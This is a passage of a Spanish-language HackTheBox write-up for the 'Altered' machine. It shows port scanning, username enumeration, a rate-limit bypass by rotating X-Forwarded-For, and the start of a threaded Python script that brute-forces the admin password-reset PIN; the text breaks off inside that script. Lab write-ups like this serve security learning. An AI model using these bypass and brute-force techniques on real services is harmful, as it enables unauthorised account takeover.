@@ -1,0 +1,762 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  Altered Machine - HackTheBox · Celero0 Blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="CeleroRKX">
+<meta name="description" content="Writeup de Altered (HTB, Hard): bypass de rate limit vía X-Forwarded-For, PHP Type Juggling para romper el control de acceso, SQLi con lectura/escritura de archivos y escalada vía Dirty Pipe.">
+<meta name="keywords" content="blog,developer,personal">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Altered Machine - HackTheBox">
+  <meta name="twitter:description" content="Writeup de Altered (HTB, Hard): bypass de rate limit vía X-Forwarded-For, PHP Type Juggling para romper el control de acceso, SQLi con lectura/escritura de archivos y escalada vía Dirty Pipe.">
+
+<meta property="og:url" content="https://celero0.github.io/posts/altered/">
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="Altered Machine - HackTheBox">
+  <meta property="og:description" content="Writeup de Altered (HTB, Hard): bypass de rate limit vía X-Forwarded-For, PHP Type Juggling para romper el control de acceso, SQLi con lectura/escritura de archivos y escalada vía Dirty Pipe.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-10-30T04:43:33+00:00">
+    <meta property="article:modified_time" content="2026-10-30T04:43:33+00:00">
+
+
+
+
+<link rel="canonical" href="https://celero0.github.io/posts/altered/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.4b392a85107b91dbdabc528edf014a6ab1a30cd44cafcd5325c8efe796794fca.css" integrity="sha256-SzkqhRB7kdvavFKO3wFKarGjDNRMr81TJcjv55Z5T8o=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="https://celero0.github.io/">
+      Celero0 Blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://celero0.github.io/posts/altered/">
+              Altered Machine - HackTheBox
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2026-10-30T04:43:33Z">
+                October 30, 2026
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              14-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <hr>
+<ul>
+<li>Tags: #Machine #Hard #Linux #SQLi #TypeJuggling #RateLimitBypass #Laravel #DirtyPipe #PHP</li>
+</ul>
+<hr>
+<h1 id="introducción">
+  Introducción
+  <a class="heading-link" href="#introducci%c3%b3n">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p><strong>Altered</strong> es una máquina Linux de HackTheBox de dificultad <strong>Hard</strong>. El vector de explotación parte de una aplicación web en Laravel (<em>UHC March Finals</em>), donde primero se abusa de la cabecera <code>X-Forwarded-For</code> para evadir el rate limiting y forzar por fuerza bruta el PIN de recuperación de contraseña del usuario <code>admin</code>. Ya autenticado, un endpoint de perfiles protegido por un parámetro <code>secret</code> resulta vulnerable a PHP Type Juggling: al enviarlo como booleano (<code>true</code>) dentro de una petición JSON, la comparación floja (<code>==</code>) de PHP lo acepta como válido sin importar el hash real, lo que además deja colar una inyección SQL (UNION-based) sobre el parámetro <code>id</code>. A través de esta inyección se leen archivos del sistema con <code>load_file()</code> y se escribe una webshell con <code>INTO OUTFILE</code>, logrando ejecución remota de comandos como <code>www-data</code>. La escalada de privilegios se logra explotando la vulnerabilidad de kernel Dirty Pipe (<code>CVE-2022-0847</code>) para obtener una shell como <code>root</code>.</p>
+<h1 id="enumeración-nmap">
+  Enumeración Nmap
+  <a class="heading-link" href="#enumeraci%c3%b3n-nmap">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Se realiza un escaneo de puertos abiertos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -p- --open -sS --max-rate <span style="color:#a5d6ff">2000</span> -n -Pn 10.129.227.109 -oG allPorts
+</span></span></code></pre></div><p>El resultado del escaneo revela únicamente 2 puertos abiertos, correspondientes al 22 y al 80. A continuación se realiza un escaneo de versiones y servicios sobre ambos puertos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p22,80 -sCV 10.129.227.109 -oN portServices
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Starting Nmap 7.99 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2026-10-29 20:10 -0400
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff7b72">for</span> 10.129.227.109
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.15s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 <span style="color:#ff7b72;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#a5d6ff">3072</span> ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 <span style="color:#ff7b72;font-weight:bold">(</span>RSA<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#a5d6ff">256</span> b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 <span style="color:#ff7b72;font-weight:bold">(</span>ECDSA<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#a5d6ff">256</span> 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 <span style="color:#ff7b72;font-weight:bold">(</span>ED25519<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#ff7b72;font-weight:bold">(</span>Ubuntu<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#ff7b72;font-weight:bold">(</span>Ubuntu<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>| http-title: UHC March Finals
+</span></span><span style="display:flex;"><span>|_Requested resource was http://10.129.227.109/login
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff7b72">done</span>: <span style="color:#a5d6ff">1</span> IP address <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 14.23 seconds
+</span></span></code></pre></div><p>Del resultado solo obtenemos los servicios que corren detrás de los puertos; además confirmamos que <code>nginx</code> está activo en el puerto 80.</p>
+<p>Para profundizar el análisis utilizaremos <code>whatweb</code>, de la siguiente forma:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whatweb http://10.129.227.109
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://10.129.227.109 <span style="color:#ff7b72;font-weight:bold">[</span><span style="color:#a5d6ff">302</span> Found<span style="color:#ff7b72;font-weight:bold">]</span> Cookies<span style="color:#ff7b72;font-weight:bold">[</span>XSRF-TOKEN,laravel_session<span style="color:#ff7b72;font-weight:bold">]</span>, Country<span style="color:#ff7b72;font-weight:bold">[</span>RESERVED<span style="color:#ff7b72;font-weight:bold">][</span>ZZ<span style="color:#ff7b72;font-weight:bold">]</span>, HTML5, HTTPServer<span style="color:#ff7b72;font-weight:bold">[</span>Ubuntu Linux<span style="color:#ff7b72;font-weight:bold">][</span>nginx/1.18.0 <span style="color:#ff7b72;font-weight:bold">(</span>Ubuntu<span style="color:#ff7b72;font-weight:bold">)]</span>, IP<span style="color:#ff7b72;font-weight:bold">[</span>10.129.227.109<span style="color:#ff7b72;font-weight:bold">]</span>, Laravel, Meta-Refresh-Redirect<span style="color:#ff7b72;font-weight:bold">[</span>http://10.129.227.109/login<span style="color:#ff7b72;font-weight:bold">]</span>, RedirectLocation<span style="color:#ff7b72;font-weight:bold">[</span>http://10.129.227.109/login<span style="color:#ff7b72;font-weight:bold">]</span>, Title<span style="color:#ff7b72;font-weight:bold">[</span>Redirecting to http://10.129.227.109/login<span style="color:#ff7b72;font-weight:bold">]</span>, UncommonHeaders<span style="color:#ff7b72;font-weight:bold">[</span>x-content-type-options<span style="color:#ff7b72;font-weight:bold">]</span>, X-Frame-Options<span style="color:#ff7b72;font-weight:bold">[</span>SAMEORIGIN<span style="color:#ff7b72;font-weight:bold">]</span>, nginx<span style="color:#ff7b72;font-weight:bold">[</span>1.18.0<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>http://10.129.227.109/login <span style="color:#ff7b72;font-weight:bold">[</span><span style="color:#a5d6ff">200</span> OK<span style="color:#ff7b72;font-weight:bold">]</span> Bootstrap, Cookies<span style="color:#ff7b72;font-weight:bold">[</span>XSRF-TOKEN,laravel_session<span style="color:#ff7b72;font-weight:bold">]</span>, Country<span style="color:#ff7b72;font-weight:bold">[</span>RESERVED<span style="color:#ff7b72;font-weight:bold">][</span>ZZ<span style="color:#ff7b72;font-weight:bold">]</span>, HTML5, HTTPServer<span style="color:#ff7b72;font-weight:bold">[</span>Ubuntu Linux<span style="color:#ff7b72;font-weight:bold">][</span>nginx/1.18.0 <span style="color:#ff7b72;font-weight:bold">(</span>Ubuntu<span style="color:#ff7b72;font-weight:bold">)]</span>, IP<span style="color:#ff7b72;font-weight:bold">[</span>10.129.227.109<span style="color:#ff7b72;font-weight:bold">]</span>, JQuery<span style="color:#ff7b72;font-weight:bold">[</span>1.9.1<span style="color:#ff7b72;font-weight:bold">]</span>, Laravel, PasswordField<span style="color:#ff7b72;font-weight:bold">[</span>password<span style="color:#ff7b72;font-weight:bold">]</span>, Script<span style="color:#ff7b72;font-weight:bold">[</span>text/javascript<span style="color:#ff7b72;font-weight:bold">]</span>, Title<span style="color:#ff7b72;font-weight:bold">[</span>UHC March Finals<span style="color:#ff7b72;font-weight:bold">]</span>, UncommonHeaders<span style="color:#ff7b72;font-weight:bold">[</span>x-content-type-options<span style="color:#ff7b72;font-weight:bold">]</span>, X-Frame-Options<span style="color:#ff7b72;font-weight:bold">[</span>SAMEORIGIN<span style="color:#ff7b72;font-weight:bold">]</span>, X-UA-Compatible<span style="color:#ff7b72;font-weight:bold">[</span><span style="color:#79c0ff">IE</span><span style="color:#ff7b72;font-weight:bold">=</span>edge<span style="color:#ff7b72;font-weight:bold">]</span>, nginx<span style="color:#ff7b72;font-weight:bold">[</span>1.18.0<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span></code></pre></div><p>En el resultado identificamos que la web usa <code>Laravel</code>, por lo cual podemos suponer que el lenguaje que corre por detrás es <code>PHP</code>.</p>
+<h1 id="enumeración-http">
+  Enumeración HTTP
+  <a class="heading-link" href="#enumeraci%c3%b3n-http">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Al ingresar a la página web nos encontramos con un <code>/login</code>, que nos solicita <code>name</code> y <code>password</code>.</p>
+<img src="/images/Pasted image 20261029211649.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Como no tenemos credenciales, podemos probar con <code>test:test</code>, a lo cual nos aparece un apartado de <code>Forgot Password?</code> y el mensaje <code>Invalid Username</code>.</p>
+<img src="/images/Pasted image 20261029211903.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Si probamos con las credenciales <code>admin:admin</code>, encontramos que el mensaje de error es diferente: <code>Invalid Password</code>. Por lo cual tenemos una vía para realizar <code>user enumeration</code>.</p>
+<img src="/images/Pasted image 20261029211914.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Si vamos al apartado de <code>/reset</code> y probamos reiniciar la contraseña de <code>admin</code>, nos aparece que el <code>pin</code> ha sido enviado al correo, y como ejemplo se muestra un código de 4 dígitos.</p>
+<img src="/images/Pasted image 20261029212008.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Si interceptamos esta petición con <code>Burpsuite</code>, tenemos la siguiente petición:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">POST</span> <span style="color:#ff7b72">/api/resettoken</span> <span style="color:#ff7b72">HTTP</span><span style="color:#ff7b72;font-weight:bold">/</span><span style="color:#a5d6ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">10.129.227.109</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">en-US,en;q=0.5</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">gzip, deflate, br</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">application/x-www-form-urlencoded</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">19</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">http://10.129.227.109</span>
+</span></span><span style="display:flex;"><span>X-Forwarded-For<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">203.0.113.19</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">keep-alive</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">http://10.129.227.109/reset</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">XSRF-TOKEN=eyJpdiI6ImVuRlBKQ2kwNGlJeEhpODJhakVXTXc9PSIsInZhbHVlIjoiRzZWeWVZQzRMZnlZdjVWZ3NUNXRLNzRSMjRFZDZzTHA5ckxhVnBpdXhyWjN6Z2NnZHVvdG9COTBIRmo0dW4rYXE5dklzTUFMVHlBT3pCYTZ2YkV5ZGJ5R1lUOE1BcHB2K0w2OXRtdkN1ZlFScWJEZHpXYzJzU29lOTZ2MGpYdEQiLCJtYWMiOiIyMjdhNjRiNTU3MzY3OGQ1Y2ExYTg2ODI5M2Q1YjNhZjdlZWZhYjI2YjZkZDdjM2NhNDNiYzM1Zjc5OTA5YjAxIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkQxSktxZGtBOURFOXlpTlVyVXlwdlE9PSIsInZhbHVlIjoiUElXOW5DWHAxSkVwdkNNVVV4SG16cWhob1BzLzlCcFRubHUzRDhKY0JRdkU5NFZ3eVZYSEZFdG8yanhGZnF6cVp4eWNVSGdvL2pzYjhtV1orR2tnazQ4SEY5OTYxcmltQitua2ZrTTgyVzVlK1UrRWpIRjc3M2hKejZwWGREWWEiLCJtYWMiOiJiYWUzMGM1MDc5OTliMjhmYWRiMTI2Y2ZhNWZhMzY0ZTkxYjk0YmI0NjE5MDk3M2FhZjJmNTE1ZWY2YzBlNDczIiwidGFnIjoiIn0%3D</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">1</span>
+</span></span><span style="display:flex;"><span>Priority<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">u=0, i</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>name=admin&amp;pin=1234
+</span></span></code></pre></div><p>Lo revelador es la respuesta de la web: en las cabeceras tenemos lo siguiente.</p>
+<p>El valor relevante es <code>X-RateLimit-Limit: 60</code> y <code>X-RateLimit-Remaining: 59</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#ff7b72">HTTP</span><span style="color:#ff7b72;font-weight:bold">/</span><span style="color:#a5d6ff">1.1</span> <span style="color:#a5d6ff">200</span> <span style="color:#f0883e;font-weight:bold">OK</span>
+</span></span><span style="display:flex;"><span>Server<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">nginx/1.18.0 (Ubuntu)</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">text/html; charset=UTF-8</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">keep-alive</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">no-cache, private</span>
+</span></span><span style="display:flex;"><span>Date<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">Fri, 30 Oct 2026 00:15:22 GMT</span>
+</span></span><span style="display:flex;"><span>X-RateLimit-Limit<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">60</span>
+</span></span><span style="display:flex;"><span>X-RateLimit-Remaining<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">59</span>
+</span></span><span style="display:flex;"><span>Access-Control-Allow-Origin<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">*</span>
+</span></span><span style="display:flex;"><span>Set-Cookie<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">laravel_session=eyJpdiI6ImJybkk4MDFDS3VvNXB2anZObDBEclE9PSIsInZhbHVlIjoiaXlNOWdKWFFQdllFSjhBTitDbDVHaGJEK0RrZkErOE9VQ3RHRmY5clV4c0xYMVE5T00xQStaeHpob2RCTW40dDlKWnIrVks2OWZYdE5hWHVZUmhhMlV3aHdXVjRkc0F5bXhvOW1mMU9DQU55K0Q5SktWOHo3WDRDY0VrT3h2SXoiLCJtYWMiOiIzNjBlN2Q5NTIxNzc3OGNmYjQ0ZWQxMTIzOGM0OGRlYmY5MTFhNTgzMjNlMjFiOTJjOTIzNWY5NzZiYzc0MjBiIiwidGFnIjoiIn0%3D; expires=Fri, 30-Oct-2026 02:15:22 GMT; Max-Age=7200; path=/; samesite=lax</span>
+</span></span><span style="display:flex;"><span>X-Frame-Options<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">SAMEORIGIN</span>
+</span></span><span style="display:flex;"><span>X-Content-Type-Options<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">nosniff</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">5650</span>
+</span></span></code></pre></div><p>Si volvemos a reenviar la petición anterior, vemos que la cabecera <code>X-RateLimit-Remaining</code> decrementa en 1, por lo cual podemos inferir que tenemos como límite 60 intentos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#ff7b72">HTTP</span><span style="color:#ff7b72;font-weight:bold">/</span><span style="color:#a5d6ff">1.1</span> <span style="color:#a5d6ff">200</span> <span style="color:#f0883e;font-weight:bold">OK</span>
+</span></span><span style="display:flex;"><span>Server<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">nginx/1.18.0 (Ubuntu)</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">text/html; charset=UTF-8</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">keep-alive</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">no-cache, private</span>
+</span></span><span style="display:flex;"><span>Date<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">Fri, 30 Oct 2026 00:21:51 GMT</span>
+</span></span><span style="display:flex;"><span>X-RateLimit-Limit<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">60</span>
+</span></span><span style="display:flex;"><span>X-RateLimit-Remaining<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">58</span>
+</span></span><span style="display:flex;"><span>Access-Control-Allow-Origin<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">*</span>
+</span></span></code></pre></div><h1 id="bypass-de-rate-limit">
+  Bypass de Rate Limit
+  <a class="heading-link" href="#bypass-de-rate-limit">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Si queremos realizar un <code>bypass</code> de este <code>rate limit</code>, podemos agregar la cabecera:
+<code>X-Forwarded-For</code>.</p>
+<blockquote>
+<p><strong>¿Qué es <code>X-Forwarded-For</code>?</strong> La cabecera HTTP <code>X-Forwarded-For</code> (XFF) sirve para identificar la dirección IP original del cliente que realiza una petición HTTP cuando esta pasa a través de uno o varios intermediarios, como un proxy inverso, balanceador de carga o CDN. Si la aplicación confía ciegamente en esta cabecera para aplicar el rate limiting por IP, basta con rotar su valor para resetear el contador.</p>
+</blockquote>
+<p>Si ahora volvemos a ver la cabecera <code>X-RateLimit-Remaining</code> usando una IP nueva en la cabecera XFF, vemos que esta se reinicia. Por lo cual tenemos una vía para realizar un ataque de fuerza bruta y encontrar el <code>pin</code> del usuario <code>admin</code>.</p>
+<p>Un script en Python que realiza el ataque de fuerza bruta hacia el <code>pin</code> es el siguiente.</p>
+<p><strong>Nota:</strong> el <code>Content-Length</code> de la respuesta por defecto es <code>5650</code> (pin incorrecto), por lo cual filtramos por ese valor para encontrar el <code>pin</code> válido.</p>
+<p>Primero creamos el entorno virtual de Python e instalamos las dependencias:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m venv venv
+</span></span><span style="display:flex;"><span>source venv/bin/activate
+</span></span><span style="display:flex;"><span>pip3 install requests
+</span></span><span style="display:flex;"><span>pip3 install pwn
+</span></span><span style="display:flex;"><span>nano brutef_pin.py
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">requests</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">from</span> <span style="color:#ff7b72">concurrent.futures</span> <span style="color:#ff7b72">import</span> ThreadPoolExecutor, as_completed
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">from</span> <span style="color:#ff7b72">threading</span> <span style="color:#ff7b72">import</span> Lock, Event
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">from</span> <span style="color:#ff7b72">pwn</span> <span style="color:#ff7b72">import</span> log, context
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff7b72;font-weight:bold">.</span>log_level <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;info&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>URL         <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;http://10.129.227.109/api/resettoken&#34;</span>
+</span></span><span style="display:flex;"><span>IGNORE_LEN  <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">5650</span>
+</span></span><span style="display:flex;"><span>THREADS     <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">20</span>
+</span></span><span style="display:flex;"><span>TOTAL       <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">10000</span>
+</span></span><span style="display:flex;"><span>TIMEOUT     <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">10</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>COOKIES <span style="color:#ff7b72;font-weight:bold">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#34;XSRF-TOKEN&#34;</span>: <span style="color:#a5d6ff">&#34;eyJpdiI6ImVuRlBKQ2kwNGlJeEhpODJhakVXTXc9PSIsInZhbHVlIjoiRzZWeWVZQzRMZnlZdjVWZ3NUNXRLNzRSMjRFZDZzTHA5ckxhVnBpdXhyWjN6Z2NnZHVvdG9COTBIRmo0dW4rYXE5dklzTUFMVHlBT3pCYTZ2YkV5ZGJ5R1lUOE1BcHB2K0w2OXRtdkN1ZlFScWJEZHpXYzJzU29lOTZ2MGpYdEQiLCJtYWMiOiIyMjdhNjRiNTU3MzY3OGQ1Y2ExYTg2ODI5M2Q1YjNhZjdlZWZhYjI2YjZkZDdjM2NhNDNiYzM1Zjc5OTA5YjAxIiwidGFnIjoiIn0%3D&#34;</span>,
